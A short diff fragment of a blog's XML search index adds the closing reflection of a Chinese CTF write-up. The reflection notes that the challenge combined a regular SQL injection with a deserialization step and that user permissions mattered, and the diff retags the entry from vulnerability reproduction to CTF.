+<p>本题考的应该是两次注入的过程，第一次常规，第二次反序列化。不过平常刷题中也要注意用户的权限问题，这里的用户权限我确实没想到。</p>
 ]]></content>
       <categories>
-        <category>漏洞复现</category>
+        <category>CTF</category>
       </categories>
       <tags>
-        <tag>漏洞复现</tag>
+        <tag>sql注入</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
 </search>
